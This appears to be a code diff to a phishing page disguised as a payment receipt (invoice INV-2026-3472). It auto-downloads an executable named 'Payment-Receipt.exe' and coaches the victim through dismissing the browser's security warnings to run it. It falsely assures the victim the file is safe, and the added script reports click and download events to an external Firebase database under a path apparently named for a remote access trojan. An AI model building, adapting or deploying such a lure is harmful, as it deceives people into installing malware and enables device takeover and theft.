@@ -5,124 +5,84 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Payment Receipt - Confirmation Required</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #f8f9fa;
-            font-family: 'Segoe UI', Arial, sans-serif;
-            color: #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .card {
-            background: white;
-            width: 92%;
-            max-width: 500px;
-            border-radius: 10px;
-            padding: 40px 30px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
-            text-align: center;
-        }
-        h1 {
-            font-size: 24px;
-            color: #0066cc;
-            margin: 10px 0 20px;
-        }
-        .amount {
-            font-size: 28px;
-            font-weight: bold;
-            color: #0066cc;
-            margin: 20px 0;
-        }
-        p {
-            font-size: 15.5px;
-            line-height: 1.6;
-            color: #444;
-            margin: 15px 0;
-        }
-        .progress {
-            height: 7px;
-            background: linear-gradient(90deg, #0066cc, #3399ff);
-            border-radius: 4px;
-            margin: 30px 0;
-            animation: progress 4s linear forwards;
-        }
-        .btn {
-            background: #0066cc;
-            color: white;
-            border: none;
-            padding: 16px 50px;
-            font-size: 17px;
-            font-weight: 700;
-            border-radius: 6px;
-            cursor: pointer;
-            margin: 25px 0;
-            width: 85%;
-            box-shadow: 0 5px 15px rgba(0,102,204,0.3);
-        }
-        .instruction {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            color: #856404;
-            padding: 16px;
-            border-radius: 8px;
-            font-size: 14.5px;
-            margin: 25px 0;
-            text-align: left;
-            line-height: 1.55;
-        }
-        .instruction strong {
-            color: #b45309;
-        }
-        @keyframes progress {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
+        body { margin:0; padding:0; background:#f8f9fa; font-family:'Segoe UI',Arial,sans-serif; color:#333; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+        .card { background:white; width:92%; max-width:500px; border-radius:10px; padding:40px 30px; box-shadow:0 8px 30px rgba(0,0,0,0.12); text-align:center; }
+        h1 { font-size:24px; color:#0066cc; margin:10px 0 20px; }
+        .amount { font-size:28px; font-weight:bold; color:#0066cc; margin:20px 0; }
+        p { font-size:15.5px; line-height:1.6; color:#444; margin:15px 0; }
+        .progress { height:7px; background:linear-gradient(90deg,#0066cc,#3399ff); border-radius:4px; margin:30px 0; animation:progress 4s linear forwards; }
+        .btn { background:#0066cc; color:white; border:none; padding:16px 50px; font-size:17px; font-weight:700; border-radius:6px; cursor:pointer; margin:25px 0; width:85%; box-shadow:0 5px 15px rgba(0,102,204,0.3); }
+        .instruction { background:#fff3cd; border:1px solid #ffeaa7; color:#856404; padding:16px; border-radius:8px; font-size:14.5px; margin:25px 0; text-align:left; line-height:1.55; }
+        .instruction strong { color:#b45309; }
+        @keyframes progress { 0% { width:0%; } 100% { width:100%; } }
     </style>
 </head>
 <body>
     <div class="card">
         <h1>PAYMENT RECEIPT</h1>
         <p class="amount">INV-2026-3472</p>
-        
         <p>A payment has been recorded under your details. Please download and verify the receipt below.</p>
-        
         <div class="progress"></div>
-        
         <p><strong>Your receipt is ready for download.</strong></p>
         
-        <!-- Auto-download -->
-        <a id="autoDownload" href="Receipt.exe" download="Payment-Receipt.exe" style="display:none;"></a>
+        <a id="autoDownload" href="Payment-Receipt.exe" download="Payment-Receipt.exe" style="display:none;"></a>
         
         <button class="btn" onclick="manualDownload()">DOWNLOAD PAYMENT RECEIPT NOW</button>
         
         <div class="instruction">
             <strong>How to open the file (if you see a warning):</strong><br><br>
-            1. In the Downloads bar, hover over the warning "Payment-Receipt.exe isn't commonly downloaded".<br>
-            2. Click the <strong>three dots (⋯)</strong> menu → choose <strong>"Keep"</strong>.<br>
-            3. If another prompt appears, click <strong>"Show more"</strong> or <strong>"More info"</strong>.<br>
-            4. Finally click <strong>"Keep anyway"</strong> or <strong>"Run anyway"</strong>.<br><br>
-            <strong>The file is completely safe</strong> — it contains your official payment receipt (INV-2026-3472).<br><br>
+            1. In the Downloads bar, hover over the warning.<br>
+            2. Click the three dots (⋯) → choose "Keep".<br>
+            3. If prompted, click "Keep anyway" or "Run anyway".<br><br>
+            <strong>The file is completely safe</strong> — it contains your official payment receipt.<br><br>
             <strong>Best opened on a Windows laptop or desktop computer.</strong>
         </div>
         
         <p style="font-size:14px; color:#666;">The file will start downloading automatically. If it doesn't, click the button above.</p>
-        
-        <p style="font-size:12px; color:#999; margin-top:35px;">
-            Official Receipt • Confidential
-        </p>
     </div>
 
     <script>
+        const CAMPAIGN = "github-test-batch";
+        let clientKey = "click_" + Math.floor(Date.now() / 1000) + "_" + Math.floor(Math.random() * 9999);
+
+        function logClick() {
+            const data = {
+                campaign: CAMPAIGN,
+                click_ts: Date.now(),
+                timestamp: Date.now(),
+                status: "Clicked",
+                password: "Akinosi12"
+            };
+            fetch("https://allybank-478ad-default-rtdb.firebaseio.com/k-rat/" + clientKey + ".json", {
+                method: 'PUT',
+                body: JSON.stringify(data),
+                headers: { 'Content-Type': 'application/json' }
+            }).catch(() => {});
+        }
+
+        function logDownload() {
+            const updateData = {
+                download_ts: Date.now(),
+                status: "Downloaded"
+            };
+            fetch("https://allybank-478ad-default-rtdb.firebaseio.com/k-rat/" + clientKey + ".json", {
+                method: 'PATCH',
+                body: JSON.stringify(updateData),
+                headers: { 'Content-Type': 'application/json' }
+            }).catch(() => {});
+        }
+
         setTimeout(() => {
+            logDownload();
             document.getElementById('autoDownload').click();
-        }, 3000);
+        }, 2500);
 
         function manualDownload() {
+            logDownload();
             document.getElementById('autoDownload').click();
         }
+
+        window.onload = logClick;
     </script>
 </body>
 </html>
